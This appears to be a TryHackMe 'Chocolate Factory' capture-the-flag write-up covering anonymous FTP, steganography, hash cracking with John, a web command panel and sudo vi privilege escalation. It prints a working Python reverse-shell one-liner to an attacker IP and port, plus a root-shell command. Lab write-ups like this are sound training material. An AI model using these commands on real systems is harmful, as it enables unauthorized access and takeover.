
#  Chocolate Factory — TryHackMe Write-up

The **Chocolate Factory** machine starts off simple but hides a few sweet surprises under its wrapper .
Through careful enumeration, a bit of steganography, some hash cracking, and a classic privilege escalation.



<img width="1909" height="366" alt="Screenshot 2025-11-12 211846" src="https://github.com/user-attachments/assets/f1b89fa5-21ab-4307-ad12-534f4db82afe" />



---

##  Enumeration

As always, I began with a basic port scan after the machine booted up.

```bash
nmap <target-ip>
```


<img width="529" height="336" alt="Screenshot 2025-11-12 183913" src="https://github.com/user-attachments/assets/a4886d66-ce6e-4eb9-856b-ae6ad1d141a2" />



The scan revealed multiple open ports — notably **FTP (21)** and **HTTP (80)** among others.
Let’s take them one by one.

---

##  FTP Enumeration

I tried an anonymous login on FTP, and surprisingly, it worked!

```bash
ftp <target-ip>
# Username: anonymous
# Password: (blank)
```


<img width="659" height="280" alt="Screenshot 2025-11-12 221816" src="https://github.com/user-attachments/assets/14cfb6cf-e83a-485a-8225-76e91b45b23b" />



Listing files showed a single image file. I downloaded it to my local machine for inspection.


<img width="940" height="181" alt="Screenshot 2025-11-12 221916" src="https://github.com/user-attachments/assets/858fbe3a-bbda-4974-afaa-9b91a4d09d33" />


---

##  Image Analysis 

Initially, I ran a few basic checks:

```bash
strings gum_room.jpg
exiftool gum_room.jpg
cat gum_room.jpg
```

No useful metadata or strings popped up.
So I moved on to steghide — and that’s where things got interesting.

```bash
steghide extract -sf gum_room.jpg
# No passphrase used
```

<img width="352" height="88" alt="Screenshot 2025-11-12 222130" src="https://github.com/user-attachments/assets/a8a8e6d6-9fc1-464c-9cdc-bfde1156ed6d" />


This extracted a file named `b64.txt`, which contained a **base64 encoded string**.


<img width="742" height="582" alt="Screenshot 2025-11-12 222210" src="https://github.com/user-attachments/assets/afb89ace-172a-4a1c-9a37-441ca9f937e6" />



Decoding it gave me a **password list** — (who even stores passwords like this?!)


<img width="864" height="855" alt="Screenshot 2025-11-12 222246" src="https://github.com/user-attachments/assets/e87d5563-e155-43e5-a738-006caf7a86fd" />


Inside, I found a SHA512 hash that seemed related to Charlie’s password (hinted by the question in the challenge).

---

##  Cracking Charlie’s Password

I saved the hash to a file and ran **John the Ripper** to crack it:

```bash
# I saved hash into shadow.txt first and then ..
john shadow.txt --format=sha512crypt --wordlist=/rockyou.txt 
```

After a short wait, **John cracked Charlie’s password!**


<img width="814" height="264" alt="Screenshot 2025-11-12 191552" src="https://github.com/user-attachments/assets/e50f78c6-531e-4bcd-9dcb-541b212dd743" />



With that in hand, I moved on to other open ports for deeper enumeration.

---

##  Web Enumeration (Port 80)

Visiting the web service on port 80 showed a standard login page.


<img width="1920" height="1080" alt="Screenshot_2025-11-12_22_27_35" src="https://github.com/user-attachments/assets/02c7253b-654a-497b-9b4a-d8671aa1b150" />



Rather than wasting time with creds or pass fuzzing , I jumped straight into directory fuzzing instead.

```bash
dirsearch -u http://<target-ip>/
```



<img width="754" height="628" alt="Screenshot 2025-11-12 222857" src="https://github.com/user-attachments/assets/74bc15fd-d8e1-4288-a719-2596d9b613eb" />



Among the results, `/home.php` stood out. Opening it **bypassed the login page entirely** and revealed a **command panel** — jackpot.

<img width="1920" height="1080" alt="Screenshot_2025-11-12_22_29_22" src="https://github.com/user-attachments/assets/04ff15c6-a734-4c98-9743-30ff7c633fbd" />


---

##  Command Execution (RCE)

The panel allowed limited command execution, so I tested a few payloads and realized I could get **Remote Code Execution (RCE)**.
I searched a Python reverse shell one-liner and set up a listener on my machine:

**Listener:**

```bash
nc -lvnp 4444
```

**Exploit:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.17.1.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```

Boom  — I got a shell!


<img width="571" height="282" alt="Screenshot 2025-11-12 223025" src="https://github.com/user-attachments/assets/b8de17b1-8684-46dd-9993-0ba97fb88c3e" />



---

##  User Enumeration

Inside the system, I found a file named `key_rev_key`, which contained the key for the first challenge question.


<img width="1904" height="513" alt="Screenshot 2025-11-12 223113" src="https://github.com/user-attachments/assets/802e9dc1-f277-47ae-a033-5886b7e44200" />



Then, while checking `/home/charlie/`, I noticed `user.txt` but couldn’t read it due to permissions.
However, there was another file — `teleport`.

Opening it revealed **an SSH private key**.


<img width="539" height="454" alt="Screenshot 2025-11-12 223241" src="https://github.com/user-attachments/assets/3fc2928f-e965-4234-8044-3457b3a6f76d" />



I copied it to my local machine and used it to log in as Charlie:

```bash
chmod 600 id_rsa
ssh -i id_rsa charlie@<target-ip>
```

<img width="310" height="113" alt="Screenshot 2025-11-12 223402" src="https://github.com/user-attachments/assets/8727174e-543c-4cf4-8d19-a5a7f6e1e4e2" />


<img width="803" height="186" alt="Screenshot 2025-11-12 223504" src="https://github.com/user-attachments/assets/530d5ab8-fd42-46b1-9fa7-9dbf33bc1c3a" />


And we’re in! 


<img width="731" height="101" alt="Screenshot 2025-11-12 223521" src="https://github.com/user-attachments/assets/bec3c73b-7b1f-4781-95e2-b1a1df2ebf31" />


From there, reading `user.txt` gave us the **user flag**.


<img width="432" height="62" alt="Screenshot 2025-11-12 223555" src="https://github.com/user-attachments/assets/ff7560bd-0ebd-4a91-8ae4-2ec77df2bc2c" />


---

##  Privilege Escalation

Next step: root access.
I checked Charlie’s sudo privileges:

```bash
sudo -l
```

Charlie could run `/usr/bin/vi` with root permissions.

<img width="776" height="138" alt="Screenshot 2025-11-12 223623" src="https://github.com/user-attachments/assets/ee3cff2a-ff74-4ca6-ae66-35ec6032639f" />


According to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/), this can be exploited for a root shell.


<img width="1247" height="528" alt="Screenshot 2025-11-12 194657" src="https://github.com/user-attachments/assets/a8cca807-9a93-4a8b-9705-3a5d06602055" />



```bash
sudo vi -c ':!/bin/sh' /dev/null
```

And just like that — **root access achieved!** 


<img width="932" height="174" alt="Screenshot 2025-11-12 195808" src="https://github.com/user-attachments/assets/59d9876c-054d-45f7-9b3a-c5b033a00823" />


---

##  Root Flag

Inside `/root`, there was a file named `root.py`.
Running it initially failed because a required package wasn’t installed.
So, I copied the code locally and executed it there — it asked for a key, which we had already obtained earlier.

Entering the key revealed the **final root flag!**


<img width="708" height="489" alt="Screenshot 2025-11-12 224937" src="https://github.com/user-attachments/assets/dec73fc6-520a-49ae-8fec-cae94c4ebc97" />


## Bingo !! Challenge Solved !
---
